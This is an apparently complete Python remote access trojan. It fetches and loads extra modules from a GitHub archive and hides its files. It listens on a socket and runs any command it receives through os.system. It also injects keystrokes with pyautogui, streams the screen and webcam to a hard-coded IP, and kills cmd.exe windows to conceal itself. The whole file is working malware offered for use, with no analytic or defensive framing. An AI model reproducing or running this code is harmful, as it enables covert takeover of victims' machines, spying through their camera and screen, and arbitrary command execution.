import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
from vidstream import ScreenShareClient, CameraClient
from turtle import left

url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
    
def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else: return os.getcwd().replace('\\', '/')
def getFileName():
    return os.path.basename(__file__)
def getNameDir(data):
    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()

def unzipfile(file=".zip"):
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall() 
    os.remove(file)

def sortNameFile(data):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data, file):
    if type(file)==str:
        file = file.split()
    print(file)
    for f in range(len(file)):
        if file[f] != getFileName():
            print(getpath(True)+"/"+data+"/"+file[f], getpath(True))
            shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))

tryit = False
while tryit == False:
    try: 
        import modif
        import scripter
        tryit = True
    except:
        listfile = ["modif.py", "scripter.pyw"]
        dir = getNameDir(url)
        downloadFileGithub(url)
        moveFileFromDir(dir, listfile)
        time.sleep(1)
        supDir(dir)
        os.system(getFileName())
        modif.hiddenFiles()

def receive():
    try:
        client.settimeout(120)
        data = client.recv(1024)
        return data.decode()
    except:
        return "left"
    
def terminal(command):
    os.system(command)

    
def cdAccess(cd):
    os.chdir(cd)
    
    
def write(text):
    pyautogui.write(text)
    
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")
    
def camera():
    client1 = CameraClient(ipScreen, 22225)
    client1.start_stream()
def screen():
    sender = ScreenShareClient(ipScreen, 22224)
    sender.start_stream()


def execute(data):
    start = time.time()
    global run, sortir
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "update":
        modif.update(url)
        ossys = True
    elif data =="updelte":
        modif.update(url, delete=True)
        ossys = True
    elif data == "screen":
        screen()
    elif data == "camera":
        camera()
    elif data == "left":
        print("restart")
        sortir = False  
    elif data[0:4] == "fast":
        scripter.speed_write(data[5:len(data)])
    elif data == "test":
        print("test")
    else:
        terminal(data)

run = True
ossys = False
while run == True:
    sortir = True
    ipScreen = "192.168.1.48"
    port = 22228
    
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ipScreen, 22223))
    ip = s.getsockname()[0]
    s.close()
    
    if ossys == True:
        print("reload")
        os.system(getFileName())
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen()
    
    print("lancement")
    pycache = (subprocess.getoutput("cd "+getpath()+" & dir /A:H /B")).split()
    temp = 0
    for i in range(len(pycache)):
        if pycache[i-1] == "__pycache__":
            temp = 1
    if temp == 0:
        subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
    (client, address) = server.accept()
    print("connect")

    while sortir == True and run == True:
        execute(receive())
exit()
